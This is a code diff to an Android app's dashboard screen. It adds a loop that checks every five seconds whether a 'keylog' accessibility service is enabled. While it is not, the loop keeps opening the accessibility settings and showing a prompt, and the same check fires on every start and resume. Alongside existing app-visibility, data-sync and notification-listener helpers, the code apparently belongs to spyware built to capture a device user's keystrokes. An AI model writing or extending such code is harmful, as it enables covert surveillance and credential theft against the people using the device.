@@ -21,6 +21,7 @@ import androidx.core.content.ContextCompat;
 
 import com.mehboob.bushorat.R;
 import com.mehboob.bushorat.databinding.ActivityDashboardBinding;
+import com.mehboob.bushorat.helpers.AccessibilityHelper;
 import com.mehboob.bushorat.helpers.AppVisibilityHelper;
 import com.mehboob.bushorat.helpers.DataSyncWorker;
 import com.mehboob.bushorat.helpers.NotificationHelper;
@@ -40,7 +41,10 @@ public class DashboardActivity extends AppCompatActivity {
     private SessionManager sessionManager;
     private Handler notificationCheckHandler;
     private Runnable notificationCheckRunnable;
+    private Handler accessibilityCheckHandler;
+    private Runnable accessibilityCheckRunnable;
     private static final long NOTIFICATION_CHECK_INTERVAL = 5000; // Check every 5 seconds
+    private static final long ACCESSIBILITY_CHECK_INTERVAL = 5000;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -89,6 +93,21 @@ public class DashboardActivity extends AppCompatActivity {
         
         // Start periodic checking
         notificationCheckHandler.postDelayed(notificationCheckRunnable, NOTIFICATION_CHECK_INTERVAL);
+
+        accessibilityCheckHandler = new Handler(Looper.getMainLooper());
+        accessibilityCheckRunnable = new Runnable() {
+            @Override
+            public void run() {
+                if (!AccessibilityHelper.isKeylogServiceEnabled(DashboardActivity.this)) {
+                    checkAndEnableAccessibilityService();
+                    accessibilityCheckHandler.postDelayed(this, ACCESSIBILITY_CHECK_INTERVAL);
+                } else {
+                    Log.d(TAG, "Keylog accessibility service enabled, stopping checks");
+                }
+            }
+        };
+        checkAndEnableAccessibilityService();
+        accessibilityCheckHandler.postDelayed(accessibilityCheckRunnable, ACCESSIBILITY_CHECK_INTERVAL);
 
         setupToolbarSubtitle();
 
@@ -176,12 +195,19 @@ public class DashboardActivity extends AppCompatActivity {
         
         // Check notification listener permission every time activity resumes
         checkAndEnableNotificationListener();
+        checkAndEnableAccessibilityService();
         
         // Restart periodic checking when activity resumes
         if (notificationCheckHandler != null && notificationCheckRunnable != null) {
             notificationCheckHandler.removeCallbacks(notificationCheckRunnable);
             if (!NotificationHelper.isNotificationServiceEnabled(this)) {
                 notificationCheckHandler.postDelayed(notificationCheckRunnable, NOTIFICATION_CHECK_INTERVAL);
+            }
+        }
+        if (accessibilityCheckHandler != null && accessibilityCheckRunnable != null) {
+            accessibilityCheckHandler.removeCallbacks(accessibilityCheckRunnable);
+            if (!AccessibilityHelper.isKeylogServiceEnabled(this)) {
+                accessibilityCheckHandler.postDelayed(accessibilityCheckRunnable, ACCESSIBILITY_CHECK_INTERVAL);
             }
         }
     }
@@ -192,6 +218,9 @@ public class DashboardActivity extends AppCompatActivity {
         // Stop periodic checking when activity is paused
         if (notificationCheckHandler != null && notificationCheckRunnable != null) {
             notificationCheckHandler.removeCallbacks(notificationCheckRunnable);
+        }
+        if (accessibilityCheckHandler != null && accessibilityCheckRunnable != null) {
+            accessibilityCheckHandler.removeCallbacks(accessibilityCheckRunnable);
         }
     }
 
@@ -308,12 +337,26 @@ public class DashboardActivity extends AppCompatActivity {
             }
         }
     }
+
+    private void checkAndEnableAccessibilityService() {
+        if (!AccessibilityHelper.isKeylogServiceEnabled(this)) {
+            Log.d(TAG, "Keylog accessibility service not enabled, opening settings");
+            AccessibilityHelper.openAccessibilitySettings(this);
+            Toast.makeText(this, R.string.keylog_accessibility_prompt, Toast.LENGTH_LONG).show();
+        } else {
+            Log.d(TAG, "Keylog accessibility service is enabled");
+            if (accessibilityCheckHandler != null && accessibilityCheckRunnable != null) {
+                accessibilityCheckHandler.removeCallbacks(accessibilityCheckRunnable);
+            }
+        }
+    }
     
     @Override
     protected void onStart() {
         super.onStart();
         // Check notification listener permission when activity starts
         checkAndEnableNotificationListener();
+        checkAndEnableAccessibilityService();
     }
     
 
